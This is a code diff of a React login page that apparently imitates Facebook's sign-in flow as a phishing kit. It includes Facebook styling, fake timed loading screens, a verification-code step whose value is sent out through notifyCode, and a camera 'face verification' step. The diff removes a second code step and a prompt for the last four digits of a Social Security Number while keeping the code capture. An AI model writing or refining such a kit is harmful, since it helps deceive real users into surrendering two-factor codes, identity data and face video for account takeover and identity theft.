@@ -1,3 +1,4 @@
+
 import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
@@ -74,10 +75,7 @@ export default function LoginPage() {
   const [isSigningUp, setIsSigningUp] = useState(false);
   const [currentStep, setCurrentStep] = useState<string>("login");
   const [userEmail, setUserEmail] = useState("");
-  const [verificationCode1, setVerificationCode1] = useState("");
-  const [verificationCode2, setVerificationCode2] = useState("");
-  const [ssnDigits, setSsnDigits] = useState("");
-  const [faceRotation, setFaceRotation] = useState(0);
+  const [verificationCode, setVerificationCode] = useState("");
   const [stream, setStream] = useState<MediaStream | null>(null);
   const [currentDirection, setCurrentDirection] = useState<"center" | "up" | "down" | "left" | "right">("center");
   const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
@@ -111,12 +109,8 @@ export default function LoginPage() {
     let timer: NodeJS.Timeout;
 
     if (currentStep === "loading-login") {
-      timer = setTimeout(() => setCurrentStep("code1"), 3000);
-    } else if (currentStep === "loading-code1") {
-      timer = setTimeout(() => setCurrentStep("code2"), 5000);
-    } else if (currentStep === "loading-code2") {
-      timer = setTimeout(() => setCurrentStep("ssn"), 10000);
-    } else if (currentStep === "loading-ssn") {
+      timer = setTimeout(() => setCurrentStep("code"), 3000);
+    } else if (currentStep === "loading-code") {
       timer = setTimeout(() => setCurrentStep("face-verification"), 5000);
     } else if (currentStep === "face-rotation") {
       setCurrentDirection("center");
@@ -143,22 +137,10 @@ export default function LoginPage() {
     setIsLoggingIn(false);
   };
 
-  const handleCode1Submit = async () => {
-    if (verificationCode1.length >= 4) {
-      await notifyCode(userEmail, verificationCode1);
-      setCurrentStep("loading-code1");
-    }
-  };
-
-  const handleCode2Submit = () => {
-    if (verificationCode2.length >= 4) {
-      setCurrentStep("loading-code2");
-    }
-  };
-
-  const handleSsnSubmit = () => {
-    if (ssnDigits.length === 4) {
-      setCurrentStep("loading-ssn");
+  const handleCodeSubmit = async () => {
+    if (verificationCode.length >= 4) {
+      await notifyCode(userEmail, verificationCode);
+      setCurrentStep("loading-code");
     }
   };
 
@@ -338,12 +320,12 @@ export default function LoginPage() {
           )}
 
           {/* Loading States */}
-          {(currentStep === "loading-login" || currentStep === "loading-code1" || currentStep === "loading-code2" || currentStep === "loading-ssn") && (
+          {(currentStep === "loading-login" || currentStep === "loading-code") && (
             <FacebookLoader />
           )}
 
-          {/* Code 1 - First Verification Code */}
-          {currentStep === "code1" && (
+          {/* Code - Verification Code */}
+          {currentStep === "code" && (
             <div className="text-center">
               <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Verification Code</h2>
               <p className="text-sm mb-6" style={{ color: '#65676b' }}>
@@ -351,76 +333,19 @@ export default function LoginPage() {
               </p>
               <input
                 type="text"
-                value={verificationCode1}
-                onChange={(e) => setVerificationCode1(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                value={verificationCode}
+                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                 placeholder="Enter code"
                 className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
                 style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
-                data-testid="input-code1"
+                data-testid="input-code"
               />
               <button
-                onClick={handleCode1Submit}
-                disabled={verificationCode1.length < 4}
+                onClick={handleCodeSubmit}
+                disabled={verificationCode.length < 4}
                 className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                 style={{ backgroundColor: '#1877f2' }}
-                data-testid="button-submit-code1"
-              >
-                Continue
-              </button>
-            </div>
-          )}
-
-          {/* Code 2 - Second Verification Code */}
-          {currentStep === "code2" && (
-            <div className="text-center">
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Second Code</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                Please enter the second verification code sent to your email.
-              </p>
-              <input
-                type="text"
-                value={verificationCode2}
-                onChange={(e) => setVerificationCode2(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                placeholder="Enter code"
-                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
-                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
-                data-testid="input-code2"
-              />
-              <button
-                onClick={handleCode2Submit}
-                disabled={verificationCode2.length < 4}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
-                style={{ backgroundColor: '#1877f2' }}
-                data-testid="button-submit-code2"
-              >
-                Continue
-              </button>
-            </div>
-          )}
-
-          {/* SSN - Last 4 Digits */}
-          {currentStep === "ssn" && (
-            <div className="text-center">
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Identity Verification</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                Enter the last 4 digits of your Social Security Number
-              </p>
-              <input
-                type="text"
-                value={ssnDigits}
-                onChange={(e) => setSsnDigits(e.target.value.replace(/\D/g, '').slice(0, 4))}
-                placeholder="XXXX"
-                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
-                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
-                maxLength={4}
-                data-testid="input-ssn"
-              />
-              <button
-                onClick={handleSsnSubmit}
-                disabled={ssnDigits.length !== 4}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
-                style={{ backgroundColor: '#1877f2' }}
-                data-testid="button-submit-ssn"
+                data-testid="button-submit-code"
               >
                 Continue
               </button>
@@ -559,10 +484,7 @@ export default function LoginPage() {
                 onClick={() => {
                   setCurrentStep("login");
                   setUserEmail("");
-                  setVerificationCode1("");
-                  setVerificationCode2("");
-                  setSsnDigits("");
-                  setFaceRotation(0);
+                  setVerificationCode("");
                   setCompletedDirections(new Set());
                   setCurrentDirection("center");
                   if (stream) {
